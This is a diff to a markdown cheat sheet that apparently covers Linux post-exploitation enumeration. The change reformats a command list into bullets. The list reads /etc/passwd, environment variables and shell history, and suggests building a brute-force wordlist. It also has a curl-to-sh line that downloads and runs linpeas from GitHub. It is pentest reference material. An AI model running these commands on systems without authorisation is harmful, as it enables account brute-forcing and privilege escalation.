@@ -2,12 +2,17 @@
 
 ## Enumaration
 
-```hostname```
-```uname -a```
-```cat /proc/version```
-```cat /etc/passwd```
-```env```
-```history```
+- ```hostname```
+
+- ```uname -a```
+
+- ```cat /proc/version```
+
+- ```cat /etc/passwd```
+
+- ```env```
+
+- ```history```
 
 
 To get a nice wordlist which will help you in bruteforcing for other user accounts you can cut /etc/passwd file to reduce the noise 
@@ -20,7 +25,9 @@ To get a nice wordlist which will help you in bruteforcing for other user accoun
 ## Automated tools
 
 ## linpeas
+
 ```curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh```
+
 ```wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh```
 
 ## linenum
